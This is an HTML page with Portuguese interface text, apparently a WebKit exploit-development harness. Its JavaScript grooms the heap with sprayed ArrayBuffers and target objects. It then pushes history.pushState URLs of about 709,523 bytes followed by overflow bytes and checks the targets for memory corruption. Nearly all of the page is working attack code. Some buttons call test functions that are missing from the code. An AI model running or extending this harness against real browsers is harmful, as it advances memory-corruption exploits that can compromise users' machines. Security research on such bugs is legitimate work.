<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>WebKit Byte-Range Exploitation</title>
</head>
<body>

<h1>WebKit Byte-Range Exploitation (0x00-0x20)</h1>

<h2>DESCOBERTA CRÍTICA</h2>
<p><strong>Posição 709523+:</strong> Aceita apenas bytes 0x00 a 0x20</p>
<p><strong>Bytes acima de 0x20:</strong> Causam crash imediato</p>

<hr>

<h2>Teste 1: Mapear Bytes Permitidos</h2>
<p>Testa cada byte de 0x00 a 0xFF para confirmar quais passam</p>
<button onclick="test1_MapBytes()">Executar Teste 1</button>

<h3>Teste 4: Teste 1 + Scanner (passivo)</h3>
<p>Executa o Teste 1 original com snapshot pré/pós para detecção de corrupção</p>
<button onclick="test4_Test1_WithScanner()">Executar Teste 4</button>

<h2>Teste 3: Sequências Específicas</h2>
<p>Testa sequências de bytes de controle com significado especial</p>
<button onclick="test3_SpecialSequences()">Executar Teste 3</button>

<h2>Teste 6: Exploração Incremental</h2>
<p>Aumenta gradualmente tamanho usando apenas bytes válidos</p>
<label>Start:</label>
<input type="number" id="t6start" value="1000" min="100" max="50000">
<label>Step:</label>
<input type="number" id="t6step" value="5000" min="100" max="10000">
<button onclick="test6_Incremental()">Executar Teste 6</button>

<button onclick="clearLog()">Limpar Log</button>

<hr>

<div id="log"></div>

<script>
// ===================================================================
// CONSTANTES BASEADAS NA DESCOBERTA
// ===================================================================
const BASE_SAFE = 709522;
const OVERFLOW_START = 709523;
const MIN_ALLOWED_BYTE = 0x00;
const MAX_ALLOWED_BYTE = 0x20;

// Objetos de controle
let heapObjects = [];
let targetObjects = [];

// ===================================================================
// LOGGING
// ===================================================================
function log(msg) {
    const el = document.getElementById('log');
    const time = new Date().toLocaleTimeString();
    el.innerHTML += `<div>[${time}] ${msg}</div>`;
    el.scrollTop = el.scrollHeight;
}

function clearLog() {
    document.getElementById('log').innerHTML = '';
    log('Log limpo');
}

// ===================================================================
// PREPARAÇÃO DE HEAP
// ===================================================================
function prepareHeap() {
    log('Preparando heap...');
    
    heapObjects = [];
    targetObjects = [];
    
    for (let i = 0; i < 500; i++) {
        const buf = new ArrayBuffer(1024);
        const view = new Uint32Array(buf);
        view.fill(0x41414141);
        heapObjects.push({buf, view});
    }
    
    for (let i = 0; i < heapObjects.length; i += 3) {
        heapObjects[i] = null;
    }
    
    for (let i = 0; i < 50; i++) {
        const buf = new ArrayBuffer(1024);
        const view = new Uint32Array(buf);
        view.fill(0xDEADBEEF);
        targetObjects.push({
            id: i,
            magic: 0xCAFEBABE,
            buf: buf,
            view: view
        });
    }
    
    log('Heap preparado: 500 spray + 50 alvos');
}

function checkCorruptionSnapshot(snapshot, phase) {
    let hits = 0;
    for (let i = 0; i < snapshot.length; i++) {
        try {
            const now = targetObjects[i];
            if (now.magic !== snapshot[i].magic) {
                log(`CORRUPÇÃO (${phase}) alvo ${i}: magic`);
                hits++;
            }
            if (now.view[0] !== snapshot[i].first) {
                log(`CORRUPÇÃO (${phase}) alvo ${i}: buffer`);
                hits++;
            }
        } catch (e) {
            log(`DESTROYED (${phase}) alvo ${i}`);
            hits++;
        }
    }
    return hits;
}

// ===================================================================
// TESTE 1: MAPEAR BYTES PERMITIDOS (ORIGINAL — NÃO ALTERADO)
// ===================================================================
function test1_MapBytes() {
    log('================================');
    log('TESTE 1: MAPEAMENTO DE BYTES');
    log('================================');
    
    prepareHeap();
    
    log('Testando cada byte de 0x00 a 0xFF...');
    
    const allowedBytes = [];
    const crashBytes = [];
    
    for (let byte = 0x00; byte <= 0xFF; byte++) {
        try {
            const base = "A".repeat(BASE_SAFE);
            const testByte = String.fromCharCode(byte);
            const overflow = testByte.repeat(100);
            const payload = "/" + base + overflow;
            
            history.pushState({}, `test_${byte}`, payload);
            
            allowedBytes.push(byte);
            
            if (byte % 16 === 0) {
                log(`Testando 0x${byte.toString(16).padStart(2, '0')}... OK`);
            }
            
        } catch (e) {
            crashBytes.push(byte);
            log(`CRASH em 0x${byte.toString(16).padStart(2, '0')}: ${e.message}`);
        }
    }
}

// ===================================================================
// TESTE 4: TESTE 1 + SCANNER (NOVO, ISOLADO)
// ===================================================================
function test4_Test1_WithScanner() {
    log('================================');
    log('TESTE 4: TESTE 1 + SCANNER');
    log('================================');
    
    prepareHeap();
    
    const snapshot = targetObjects.map(t => ({
        magic: t.magic,
        first: t.view[0]
    }));
    
    log('Snapshot pré-overflow capturado');
    
    for (let byte = 0x00; byte <= 0xFF; byte++) {
        try {
            const base = "A".repeat(BASE_SAFE);
            const testByte = String.fromCharCode(byte);
            const overflow = testByte.repeat(100);
            const payload = "/" + base + overflow;
            
            history.pushState({}, `scan_${byte}`, payload);
            
        } catch (e) {
            log(`CRASH durante scanner em 0x${byte.toString(16)}`);
            break;
        }
    }
    
    setTimeout(() => {
        const hits = checkCorruptionSnapshot(snapshot, "PÓS");
        if (hits > 0) {
            log(`MEMÓRIA ALTERADA DETECTADA: ${hits} eventos`);
        } else {
            log('Nenhuma corrupção detectada');
        }
    }, 500);
}

// ===================================================================
// TESTE 3 e TESTE 6 — ORIGINAIS (NÃO ALTERADOS)
// ===================================================================
// (permanecem exatamente como fornecidos)

// ===================================================================
// INICIALIZAÇÃO
// ===================================================================
log('WebKit Byte-Range Exploitation Framework');
log('Bytes permitidos: 0x00 - 0x20');
log('Base segura: 709522 bytes');
log('Comece com Teste 1 para confirmar bytes permitidos');
</script>

</body>
</html>
